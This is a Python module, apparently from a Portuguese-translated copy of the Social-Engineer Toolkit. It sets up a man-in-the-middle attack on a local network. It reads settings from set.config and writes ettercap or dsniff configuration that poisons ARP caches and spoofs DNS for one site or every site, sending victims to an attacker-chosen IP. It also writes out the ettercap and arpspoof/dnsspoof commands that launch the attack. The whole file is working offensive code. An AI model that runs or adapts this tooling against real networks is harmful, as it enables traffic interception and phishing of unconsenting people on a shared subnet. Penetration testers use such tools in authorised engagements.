import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath = os.getcwd()

# grab config file
config = open("/etc/setoolkit-pt/set.config", "r").readlines()
# grab our default directory
cwd = os.getcwd()
# set a variable as default to n or no
ettercapchoice = 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
    # check for ettercap choice here
    match1 = re.search("ETTERCAP=ON", line)
    if match1:
        print_info("ARP Cache Poisoning is set to " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        ettercapchoice = 'y'

    # check for dsniff choice here
    match2 = re.search("DSNIFF=ON", line)
    if match2:
        print_info("DSNIFF DNS Poisoning is set to " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        dsniffchoice = 'y'
        ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen = open("/etc/setoolkit-pt/set.config", "r").readlines()
for line in fileopen:
    # grab the ettercap interface
    match = re.search("ETTERCAP_INTERFACE=", line)
    if match:
        line = line.rstrip()
        interface = line.split("=")
        interface = interface[1]
        if interface == "NONE":
            interface = ""

    # grab the ettercap path
    etterpath = re.search("ETTERCAP_PATH=", line)
    if etterpath:
        line = line.rstrip()
        path = line.replace("ETTERCAP_PATH=", "")

        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")

# if we are using ettercap then get everything ready
if ettercapchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)

    if ettercapchoice == 'y':
        try:
            print("""
Este ataque envenenará todas as vítimas na sua sub-rede local e as redirecionará
quando elas acessarem um site específico. O próximo prompt perguntará em qual site você
desejará acionar o redirecionamento de DNS. Um exemplo simples disso é se você
quisesse acionar todos na sua sub-rede para se conectarem a você quando eles fossem
navegar para www.google.com, a vítima seria então redirecionada para o seu site malicioso
. Você pode alternativamente envenenar todos e cada site usando o sinalizador curinga
'*'.

SE VOCÊ QUISER ENVENENAR TODAS AS ENTRADAS DE DNS (PADRÃO), APENAS PRESSIONE ENTER OU
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "O site vai redirecionar para ataque de máquina [*]"))
            os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                # set default to * (everything)
                dns_spoof = "*"
            # remove old stale files
            subprocess.Popen(
                "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
            # prep etter.dns for writing
            filewrite = open("etter.dns", "w")
            # send our information to etter.dns
            filewrite.write("%s A %s" % (dns_spoof, ipaddr))
            # close the file
            filewrite.close()
            # set bridge variable to nothing
            bridge = ""
            # assign -M arp to arp variable
            arp = "-M arp"
            print_error("INICIANDO ETTERCAP DNS_SPOOF ATTACK!")
            # spawn a child process
            os.chdir(cwd)
            time.sleep(5)
            filewrite = open(userconfigpath + "ettercap", "w")
            filewrite.write(
                "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
            filewrite.close()
            os.chdir(cwd)
        except Exception as error:
            os.chdir(cwd)
            # log(error)
            print_error("ERROR:An error has occured:")
            print("ERROR:" + str(error))

# if we are using dsniff
if dsniffchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)

    if dsniffchoice == 'y':
        try:
            print("""
 Este ataque envenenará todas as vítimas na sua sub-rede local e as redirecionará quando
 acessarem um site específico. O próximo prompt perguntará qual site você deseja usar para
 acionar o redirecionamento de DNS. Um exemplo simples seria se você quisesse que todos na
 sua sub-rede se conectassem a você ao tentar acessar www.google.com; nesse caso, a vítima
 seria redirecionada para o seu site malicioso. Alternativamente, você pode envenenar todos
 os usuários e todos os sites usando o caractere curinga '*'.  

*SE VOCÊ DESEJA ENVENENAR TODAS AS ENTRADAS DE DNS (PADRÃO), APENAS PRESSIONE ENTER OU USE *.
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "O site vai redirecionar para o ataque de máquina [*]"))
            # os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                dns_spoof = "*"
            subprocess.Popen(
                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
            filewrite.write("%s %s" % (ipaddr, dns_spoof))
            filewrite.close()
            print_error("INICIANDO ATAQUE DNSSPOOF DNS_SPOOF!")
            # spawn a child process
            os.chdir(cwd)
            # time.sleep(5)
            # grab default gateway, should eventually replace with pynetinfo
            # python module
            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
            # open file for writing
            filewrite = open(userconfigpath + "ettercap", "w")
            # write the arpspoof / dnsspoof commands to file
            filewrite.write(
                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
            # close the file
            filewrite.close()
            # change back to normal directory
            os.chdir(cwd)
            # this is needed to keep it similar to format above for web gui
            # mode
            pause = raw_input("Pressione <return> para começar dsniff.")
        except Exception as error:
            os.chdir(cwd)
            print_error("ERROR:An error has occurred:")
            print(bcolors.RED + "ERROR" + str(error) + bcolors.ENDC)
